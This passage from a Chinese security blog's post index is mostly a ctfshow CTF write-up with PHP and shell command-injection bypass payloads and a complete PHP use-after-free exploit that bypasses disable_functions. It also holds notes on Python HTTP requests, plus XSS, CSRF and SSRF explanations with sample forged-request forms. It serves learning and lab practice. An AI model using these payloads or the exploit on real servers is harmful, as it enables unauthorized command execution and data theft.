fla*.php\");?>\n```\n\n过滤了flag并且包含的是变量c.php，输入后相当于直接执行输入的PHP命令，由于前面的PHP内容已经闭合，所以后面的.php直接就是.php文本显示，对前面的命令输入没有影响\n\n##### 40\n\n```\npayload:?c=eval(array_pop(next(get_defined_vars())));\n\nPOST:a=system('cat flag.php');\n```\n\nprint_r(get_defined_vars());可以拿到所有已经定义的变量并取得值\n\nnext(变量)可以获得下一个变量\n\narray_pop(数组)弹出数组中的变量为单个独立变量\n\n```\nc=session_start();system(session_id());\npassid=ls\n```\n\n本地修改sessionID传入命令\n\n##### 41\n\n```\n\n```\n\n```\n'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i'\n```\n\n可以发现大多数自负都被过滤，查看提示\n\n通过脚本可获取异或（｜）后能得到的所有字符\n\n直接使用脚本\n\n##### 42\n\n```\npayload:?c=cat flag.php;\n```\n\n$c.\" >/dev/null 2>&1\"\n\n题目中将命令输出保存到黑洞中，可通过分号分割命令让第一个执行的命令直接显示\n\n##### 43\n\n```\npayload:?c=tac%20flag.php%26%26\n```\n\n同上题，过滤了cat和分号，通过&&也可进行多命令执行，要进行URL编码\n\n##### 44\n\n```\npayload:?c=tac%20fla*.php%26%26\n```\n\n同上题，过滤了flag，使用通配符\n\n##### 45\n\n```\npayload:?c=tac${IFS}fla*.php%26%26\n```\n\n同上题，过滤了空格，找个能替代的就行\n\n##### 46\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\n同上题，过滤了*和$，使用%09（制表符）替代空格\n\n##### 47\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\n同上题，过滤了一些读取文件的命令，但没滤tac，直接用\n\n##### 48\n\n```\npayload:?c=tac<fl%27%27ag.php%26%26\n```\n\n同上题，过滤了数字和空格\n\n##### 49\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n同上题，过滤了水平制表符和&&符，将&更换为｜也可以多命令执行\n\n##### 50\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n##### 51\n\n```\npayload:?c=nl<fla%27%27g.php||\n```\n\n滤了tac呜呜呜呜用nl\n\n##### 52\n\n```\npayload:?c=nl${IFS}/fl%27%27ag||\n```\n\n滤掉了尖括号但是$回来了\n\n`nl${IFS}fla%27%27g.php||`\n\n但是明显flag不对，所以看一下根目录`ls${IFS}/`发现flag存在\n\n使用nl读取\n\n##### 53\n\n```\npayload:?c=ta%27%27c${IFS}fla?.php\n```\n\n该题内容不同\n\n```\necho($c);\n$d = system($c);\necho \"<br>\".$d;\n```\n\n先将命令打印并执行后获得system函数的返回值并输出，system函数只返回命令执行后输出的最后一行，使用tac\n\n##### 54\n\n```\npayload:c=mv${IFS}fla?.php${IFS}kkk.txt\n/kkk.txt\n```\n\n过滤了单引号绕过，通过mv命令重命名直接读取\n\n##### 55\n\n过滤`\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\"\n\n**无字母数字的命令执行**\n\n直接讲原理咯\n\n.（点）或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则“.file”的意思就是用bash执行file文件中的命令。用“.file”执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用“.”来执行它了吗？\n\n咋执行呢，原理是当我们发送一个上传文件的POST包时，这个文件会被储存在临时目录中，默认的文件是`/tmp/phpXXXXXX`(六个随机字符)，那么我们就可以用通配符（?单匹配和*多匹配）来尝试执行我们上传的文件，但是尝试执行后发现不行，我们自己搭建一个php环境看一下为什么\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming1.png)\n\n列出相关的文件后发现是因为符合匹配条件的文件数量不止一个，就导致还没运行到我们上传的脚本时就已经结束了，所以我们要尝试用其他的通配符匹配出我们需要的文件，查看相关资料，Linux的glob通配符的相关内容（贴个链接）\n\nhttps://man7.org/linux/man-pages/man7/glob.7.html\n\n除了使用?和*进行任意匹配，还可以使用`[^X]`来排除某个字符，这样我们就可以排除前面包含`-`和`.`文件，继续查看发现还剩下三个文件，而后发现还有一个通配符语法`[X-Y]`可以表示一个范围，而且只有php临时文件中包含大写字母，查询ascii码表发现大写字母位于`@`和`[`之间，所以构造`[@-[]`就可以匹配到我们的文件了\n\n最终payload\n\n首先构建一个上传文件的html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST数据包POC</title>\n</head>\n<body>\n<form action=\"当前链接/?c=./???/????????[@-[]\" method=\"post\" enctype=\"multipart/form-data\">\n    <label for=\"file\">文件名：</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n```\n\n第一个文件内容\n\n```shell\nls\n然后\ncat /var/www/html/flag.php\n```\n\n如果一次不成功就repeater多试几次\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png)\n\n拿到flag\n\n##### 57\n\n```\npayload:?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\n\n过滤了大量字符，最终需要构建36即可，没有过滤`$`，而在Linux中$是变量的关键字，所以我们可以使用变量\n\n```\n$(())这个变量中的()代表数学运算，结果为0，所以\necho $(())\n0\n对这个变量进行取反操作结果为\necho ~$(())\n~0\n那么我们再对~0进行数学运算得到的结果就是\necho $((~$(())))\n~1\n所以我们想得到36就是让36个~1相加再取反\necho $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n##### 58\n\n```\npayload:\nPOST\nc=file_get_contents('flag.php')\n```\n\n命令执行，突破禁用函数\n\n首先尝试system发现被过滤了，emmmm尝试过后发现能执行系统命令的全被禁用了\n\n那么尝试能否读取文件，使用file_get_contents读取成功，提示中也显示show_source同样可用\n\n##### 59\n\n```\npayload:\nPOST\nc=show_source('flag.php')\n```\n\n能执行系统命令的就别试了，全挂了\n\nshow_source可用\n\n还可尝试通过include来包含文件，再通过PHP伪协议进行读取\n\n```\npayload:?file=php://filter/read=convert.base64-encode/resource=flag.php\nPOST\nc=include($_GET['flie']);\n```\n\n##### 60\n\n```\npayload:\nPOST\nc=highlight_file('flag.php');\n```\n\n上一题可用的方法也可\n\n##### 61\n\n同上\n\n##### 62\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n上面所有方法皆可\n\n##### 63\n\n```\npayload:\nPOST\nc=include('flag.php');var_dump(get_defined_vars());\n```\n\n`get_defined_vars()`可获得所有已定义的变量，当不知道变量名时可使用这个\n\n上面方法同样🉑️\n\n##### 64\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n`scandir('.')`可用于扫描文件，和ls一个意思，当我们不知道文件名时可使用\n\n##### 65\n\n同上\n\n##### 66\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19 17.49.25.png)\n\n尝试失败还被嘲讽了，首先扫描一下文件，发现根目录下有flag.txt，`highlight_file('/flag.txt')`读取即可\n\n```\npayload:\nPOST\nc=highlight_file('/flag.txt');\n```\n\n##### 67\n\n同上\n\n##### 68\n\n```\npayload:\nPOST\nc=include('/flag.txt')\n```\n\n属于是离谱了，直接封了`highlight_file`函数，`var_dump(scandir('/'))`，发现在根目录中，直接include文件，没有php标签即为直接显示源码，等于直接显示flag.txt的内容\n\n##### 69\n\n同上\n\n##### 70\n\n继续白嫖\n\n##### 71\n\n```\npayload:\nPOST\nc=include('/flag.txt');exit();\n```\n\n尝试白嫖发现失败，下载源码进行查看，发现在输出之前将缓冲区中的所有数字字母换成了问号，那么我们让它包含完直接退出就行了\n\n##### 72\n\n文件换位置了哭哭，scandir找不到根目录，var_dump也没了，哭哭\n\n看提示\n\n首先找出文件名\n\n```PHP\npayload:\nPOST\nc=$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n} exit(0);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19 23.52.16.png)uaf脚本如下\n\n```PHP\n<?php\nfunction ctfshow($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace();\n            if(!isset($backtrace[1]['args'])) {\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr & 0xff));\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v & 0xff));\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { \n\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { \n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) {\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) {\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; \n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); \n    write($abc, 0xd0 + 0x68, $zif_system); \n\n    ($helper->b)($cmd);\n    exit();\n}\n\nctfshow(\"cat /flag0.txt\");ob_end_flush();\n?>\n\n```\n\n最终\n\n```\npayload:\nPOST\nc=上面的代码\n```\n\n##### 73\n\n同上，文件名更改为flagc\n\n##### 74\n\n```\npayload:\nPOST\nc=include('/flagx.txt');exit();\n```\n\n首先扫目录，同上题payload，而后发现在根目录有flagx.txt尝试包含成功\n\n##### 75\n\nban掉了open_basedir访问文件的方式，只能通过别的方法来访问文件，可以通过mysql访问，在前面几题中可以找到mysql的账号密码，最终payload如下\n\n```PHP\npayload:\nPOST\nc=try {\n  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');\n  foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n\t{\n    echo($row[0]); \n  }\n  $dbh = null;\n}\ncatch (PDOException $e) \n{\n  echo $e->getMessage();\n  exit(0);\n}\nexit(0);\n```\n\n拓展PDO知识：\n\n```PHP\nPHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。\nPDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。\nPDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。\n一个实例\n<?php\n$dbms='mysql';     //数据库类型\n$host='localhost'; //数据库主机名\n$dbName='test';    //使用的数据库\n$user='root';      //数据库连接用户名\n$pass='';          //对应的密码\n$dsn=\"$dbms:host=$host;dbname=$dbName\";\n\ntry {\n    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象\n    echo \"连接成功<br/>\";\n    /*你还可以进行一次搜索操作\n    foreach ($dbh->query('SELECT * from FOO') as $row) {\n        print_r($row); //你可以用 echo($GLOBAL); 来看到这些值\n    }\n    */\n    $dbh = null;\n} catch (PDOException $e) {\n    die (\"Error!: \" . $e->getMessage() . \"<br/>\");\n}\n//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT => true) 变成这样：\n$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));\n\n?>\n```\n\n##### 76\n\n同上改名字\n\n##### 77\n\n首先还是扫目录，文件名flag36x.txt，尝试上题方法发现数据库消失，看提示是PHP7.4以上的新特性，可以通过新建一个FFI对象来执行系统命令，又因为执行系统命令后没有回显，所以我们把执行后的结果放到网站目录下的一个文本文件中进行读取\n\n```php\npayload:\nPOST\nc=$ffi = FFI::cdef(\"int system(const char *command);\");\n$a='/readflag > /var/www/html/1.txt';\n$ffi->system($a);\n```\n\n然后访问/1.txt即可\n\n##### 118\n\n首先查看源码，发现输入被包含到system函数中执行，尝试`echo，whoami，ls，cat`全部失效想方法绕过，输入空格发现可以执行，所以可以尝试通过构造系统变量来执行，查看提示的图片\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21 16.39.03.png)\n\n发现是默认配置文件下的文件名列表，可以通过剪裁构造变量，读取文件命令最容易进行构造的就是`nl`，想拼接出nl只需要取系统配置变量最后一位n和当前执行目录最后一位l即可，最终payload如下\n\n```\npayload:${PATH:~0}${PWD:~0}$IFS????.???\n```\n\n发现还是不行，是因为过滤了数字，没关系，剪裁字符还可通过大写字母解决，真·最终payload如下\n\n```\npayload:${PATH:~A}${PWD:~A}$IFS????.???\n```\n\n**系统变量补充知识**\n\n```\n$PATH 系统配置变量\n$PWD 当前执行目录\n$HOME 默认进入的目录\n$SHELL\n$USER 当前user\n$SHLVL 代表当前shell窗口的深度，一般为1\n$PHP_CFLAGS 指定头文件（.h文件）的路径，如：CFLAGS=-I/usr/include -I/path/include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。\n$PHP_VERSION PHP版本\n\n```\n\n**Linux变量补充知识**\n\n```\n${变量名:从哪一位开始取:取多长}，如没有长度默认取到最后，如果没有起始位就从头开始\n${#变量名}，代表这个变量的长度\n$\n```\n\n##### 119\n\n先尝试上一把的是否可行，不行所以直接看提示吧，系统变量的知识补充在上一道题了，针对本题\n\n```\nSHLVL的值为2，#SHLVL的值为1，从PHP_VERSION的第二位取一个为3，也就是${PHP_VERSION:${SHLVL}:${#SHLVL}}为3，最终取\nPHP_CFLAGS变量从第三位开始的前三个即可构造tac\n```\n\n最终payload如下\n\n```\npayload:${PHP_CFLAGS:${PHP_VERSION:${SHLVL}:${#SHLVL}}:${PHP_VERSION:${SHLVL}:${#SHLVL}}} ????.???\n```\n\n##### 120\n\n上一把的字符太长了，只能通过别的命令读取了\n\n```\ntips：Linux中的base64在/bin目录之下，base64 文件名即可将文件进行base64编码\n```\n\n所以我们最终构造出结果为/bin/base64 flag.php即可\n\n首先是/字符，PWD首位，而后bin可使用通配符，尝试base64也使用通配符不可行，所以我们尝试构建出数字4来匹配\n\n```\ntips：RANDOM变量能生成一万以内的随机数，用#取长度即可有概率得到4\n```\n\n最终payload\n\n```\npayload:\nPOST\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\n```\n\n~~多刷新几次总会出来的~~\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21 19.36.51.png)\n\n##### 121\n\n尝试上题payload，发现SHLVL被过滤了，所以我们需要一个1\n\n```\ntips:通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误\n```\n\n所以我们使用${#?}即可构造出1，最终payload如下\n\n```\npayload:\nPOST\ncode=AAAAAAAAA\ncode=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???\n```\n\n##### 122\n\n滤了PWD但是有HOME，HOME替换PWD就行，滤了#号没发去长度，RANDOM取一位即可，随机到了就是胜利\n\n```\npayload:\nPOST\ncode=A;${PWD::${?}}???${PWD::${?}}?????${RANDOM} ????.???\n```\n\n","tags":["CTF","web"]},{"title":"Python于web层应用","url":"/posts/4256.html","content":"\n# Python于web层应用\n\n## HTTP协议基础\n\n### 协议分类\n\nHTTP 1.0 80端口 单次一个链接\n\nHTTP 1.1 80端口 多次可一个链接\n\nHTTP协议不够安全，进而发展出了HTTPS协议\n\nHTTPS 443端口 加密后数据传输\n\n<!--more-->\n\n### 请求方法\n\n###### HTTP 1.0\n\nGET POST HEAD\n\n###### HTTP 1.1与HTTPS\n\nOPTIONS PUT DELETE TRACE CONNECT PATCH\n\n### URL格式\n\n协议://主机名.域名/文件夹/文件?参数=值&参数=值\n\n### HTTP请求头\n\nUser-Agent：浏览器版本信息\n\nAccept-encoding：浏览器接受的编码\n\nReferer：当前网页跳转来源\n\nCookie：顾名思义，~~好吃的饼干，~~Cookie信息\n\nLocation：跳转到哪里\n\nSet-Cookie：设置Cookie信息\n\nWWW-Authenticate：用于身份验证HTTP Basic等\n\n### HTTP响应状态码\n\n1XX：信息提示\n\n2XX：成功\n\n3XX：重定向\n\n4XX：客户端错误\n\n5XX：服务端错误\n\n### 查看HTTP\n\n使用浏览器审查进行查看\n\n使用Burpsuite截断查看\n\n## Python使用HTTP请求\n\n###### GET请求\n\n不带参数`requests.get(url)`\n\n带参数`requests.get(url=url,params={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n返回的对象r.url获取url\n\n###### POST请求\n\n不带参数`requests.post(url)`\n\n带参数`requests.post(url=url,data={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n###### 自定义请求头\n\nheaders={key1:value1,key2:value2}\n\nrequests.get(url=url,headers=headers)\n\n###### 其他请求\n\nrequests.put(url,data)\n\nrequests.delete(url)\n\nrequests.head(url)\n\nrequests.options(url)\n\n## Python处理HTTP响应\n\n**获取相应状态码：**r.status_code\n\n**获取响应文本：**r.content（获取到二进制内容）r.text（获取原始文本代码）\n\n**获取相应头：**r.headers\n\n**获取请求头：**r.reuqests.headers\n\n**获取请求URL：**r.url\n\n**获取Cookie：**r.cookies\n\n## Python设置HTTP代理\n\n**代理设置：**http和https:`proxies={'http':'http://代理服务器:代理端口','https':'https://代理服务器:代理端口'}`\n\n**参数设置：**`proxies=proxies,verfiy=False`\n\n## Python会话编程\n\n通过Set-Cookie设置一个cookie值\n\n使用`s=requesets.Session()`建立一个新的空会话\n\n`r=s.get(url)`来在会话中发起个体请求\n\n## Python制作目录扫描工具\n\n###### 目录扫描原理\n\n1、读取字典文件拼接URL\n\n2、通过get请求访问URL\n\n3、获取状态码判断目录是否存在\n\n###### 字典文件读取\n\n1、`with open(\"filename.txt\",\"r\") as f:`\n\n2、读取方式：\n\n- `f.readline()//读取一行`\n- `f.readlines()//逐行读取到一个列表中`\n- `f.read(字节数)//按字节读`\n- `line.strip()//去除空行`\n\n3、`f.close()`关闭文件流\n\n4、sys库中的sys.argv[0]为当前python文件绝对路径，sys.argv[1]为传入第一个参数\n\n5、User-Agent通过抓包先获取真实的User-Agent，再通过headers字典传入get请求\n\n## IIS PUT漏洞\n\nIIS中拓展工具WebDAV支持HTTP方法，也提供了一些其他功能强大的方法（Move），使得开启WebDAV可以直接上传任意文件\n\n**探测方法：**通过HTTP中options方法可以探测出服务器支持的HTTP方法\n\n**探测过程：**\n\n- 确定目标主机\n- 使用HTTP options方法探测\n- 查看返回结果中是否存在MOVE PUT\n- 查看响应头中的PUBLIC属性\n\n## 探测服务器信息\n\n相应头中的Server：服务器中间件属性\n\nX-Powered-By：服务器脚本技术\n\n## Python制作漏洞检测工具\n\n首先了解漏洞产生原理，根据漏洞原理写出对应的POC代码来验证漏洞是否存在\n\n## 构建站点地图\n\n测试Web App的首要任务就是获取站点完整的目录和文件\n\n###### 技术种类：建议使用两种方式同时进行\n\n1、通过基于字典的目录文件扫描\n\n2、通过基于网络爬虫的技术（可通过requests库构建，但是很复杂，有scrapy库可用于构建爬虫）\n\n3、通过Burpsuite构建网站地图\n","tags":["web"]},{"title":"文件包含","url":"/posts/59563.html","content":"\n# 文件包含\n\n","tags":["CTF","web"]},{"title":"XSS","url":"/posts/7933.html","content":"\n# XSS\n\n#### 内容：\n\n全称为跨站脚本攻击，是一种Web应用程序的漏洞，来自用户的不可信数据在没有验证的情况下被应用程序进行了处理，没有正确转义（escape）或编码（encode）反射回浏览器，导致浏览器引擎执行了非预期代码\n\n#### 类型：\n\n###### 反射性：直接传输代码后，经过后端渲染代码直接放入了前端页面中\n\n###### 存储型：将代码经过后端处理存入数据库，当从数据库查询经前端渲染后代码被执行\n\n###### DOM型：不需要以来服务端相应内容，如果HTML页面中使用了document.location等DOM元素的属性，攻击者就可以利用这些属性注入恶意脚本实施基于DOM的跨站脚本攻击\n\n<!--more-->\n\n#### DOM：\n\nDocument Object Model（文档对象模型），通过HTLM DOM，树中所有节点都可通过JavaScript进行访问，修改，创建，删除\n\n![DOM示意](/images/DOM示意.png)\n\nXSS盲打：\n\n构架script标签使受害者执行，通过document.location和document.cookie获取到受害者的cookie及管理页面等隐私内容导致网站内容泄漏\n\n```html\n<sCRiPt sRC=></sCrIpT>\n```\n\n\n\n#### CSRF：\n\n跨站请求伪造\n\n攻击流程：通过获取受害的Cookie等信息，伪造对应用户的请求头，通过用户身份![CSRF](/images/CSRF.jpg)\n\n使用方法：制作网站时可通过构造img标签直接访问，如\n\n```html\n<img src=\"http://www.myBank.com/Transfer.php?toBankId=1111&money=1000\">\n```\n\n或者通过JavaScript构造post请求并通过dom元素直接提交，如\n\n```html\n<html>\n　　<head>\n　　　　<script type=\"text/javascript\">\n　　　　　　function steal()\n　　　　　　{\n          　　　　 iframe = document.frames[\"steal\"];\n　　     　　      iframe.document.Submit(\"transfer\");\n　　　　　　}\n　　　　</script>\n　　</head>\n\n　　<body onload=\"steal()\">//页面完全载入后触发\n　　　　<iframe name=\"steal\" display=\"none\">\n　　　　　　<form method=\"POST\" name=\"transfer\"　action=\"http://www.myBank.com/Transfer.php\">\n　　　　　　　　<input type=\"hidden\" name=\"toBankId\" value=\"11\">\n　　　　　　　　<input type=\"hidden\" name=\"money\" value=\"1000\">\n　　　　　　</form>\n　　　　</iframe>\n　　</body>\n</html>\n```\n\n或者完全伪造原表单，并且填写好内容，通过javascript直接提交\n\n```html\n<body>\n    <form method=\"post\" action=\"money.php\" id=\"mon\">\n        用户名：<input type=\"text\" name=\"user\" id=\"user\" value=\"Jlan\">\n        转账人：<input type=\"money\" name=\"money\" id=\"pass\" value=\"100000\">\n    </form>\n    <script>\n        document.getElementById(\"mon\").submit()\n    </script>\n</body>\n```\n\n#### SSRF：\n\n服务端请求伪造\n\n攻击流程：通过页面中可访问其他页面的位置通过服务端发起请求进而获取到客户端无法访问的内部系统\n\n攻击位置：有在线翻译，页面收藏，图片加载下载等\n","tags":["CTF","web"]},{"title":"Python面向对象","url":"/posts/18439.html","content":"\n# Python面向对象\n\n#### 类的定义：\n\n```python\n#object是所有类的基类\n#每个对象会保存自己的属性，不同对象间属性没有必然联系\n#类内部可通过self操作\nclass 类名(object):\n  def 函数名(self):\n    方法内容\n\t\n```\n\n<!--more-->\n\n#### 类外操作对象属性：\n\n```python\n对象名.属性名=属性内容#给类添加或修改属性\n```\n\n#### 魔法方法：\n\n这类方法以双下划线开头和结尾，在满足某种特定条件是会调用这种方法\n\n```python\n#创建对象后会立即调用\n#使用时类似构造函数\n__init__(self,参数1,参数2)\n```\n\n```python\n#该方法返回值为字符串，在使用print(对象)时会自动调用\n#进行强制类型转换时也会自动调用\n__str__(self)\n```\n\n```python\n#对象在内存中被销毁时会调用\n#使用时类似析构函数，可使用del 变量名进行销毁\n__del__(self)\n```\n\n","tags":["Note","Python"]},{"title":"Python基础","url":"/posts/14702.html","content":"\n# Python基础\n\n#### 数据类型：\n\nstring（字符串）\n\nnum（数字）\n\nbool（布尔）\n\nlist（列表）使用[    ]定义\n\ntuple（元组）使用{     }定义（无序）\n\ndictionary（字典）使用{     }定义，内容为：下标名:元素内容\n\n<!--more-->\n\n#### 字符串相关函数：\n\n###### 查找：\n\n```python\nstr.find(str1,start,end)//rfind从末尾开始查找\nstr.index(str1,start,end)//rindex从末尾开始查找\n```\n\n在字符串中查找是否存在str1，存在返回第一次出现的位置，不存在find返回-1，index报错\n\n```python\nstr.count(str1,start,end)\n```\n\n查找字符串中某字符串出现的次数\n\n###### 替换：\n\n```python\nstr.replace(old,new,count)\n```\n\n将字符串中old内容替换为new，count为最大替换次数，返回新字符串，不改变原来字符串\n\n###### 切割：\n\n```python\nstr.split(str1,count)\n```\n\n将字符串以str1为分隔切割，count为最大切割次数，返回一个列表，不改变原有字符串，默认按空白字符进行全切割\n\n###### 加入：\n\n```python\nstr.join(可迭代对象)\n```\n\n将str插入到可迭代对象两个元素之间，返回一个字符串\n\n###### 